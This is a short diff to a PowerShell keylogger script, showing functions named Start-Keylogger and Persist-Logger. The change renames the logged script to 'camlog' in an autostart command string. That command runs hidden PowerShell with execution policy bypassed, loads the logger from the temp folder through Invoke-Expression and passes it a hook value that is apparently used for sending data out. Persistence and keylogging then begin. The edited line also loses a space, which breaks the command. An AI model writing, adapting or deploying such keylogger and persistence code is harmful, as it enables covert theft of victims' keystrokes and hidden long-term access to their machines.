@@ -130,6 +130,7 @@ Start-Keylogger{
     }While ($a -le 5);
 }
 
-$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $Days +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
+$name = "camlog";
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $Days +  ';Get-Item' + $name + '.ps1 | Invoke-Expression;sleep 5;exit'); 
 Persist-Logger "txtlog" -Command $autostart -Days $DaysRun
 Start-Keylogger -RunTime $RunTime -TimesRun $TimesRun
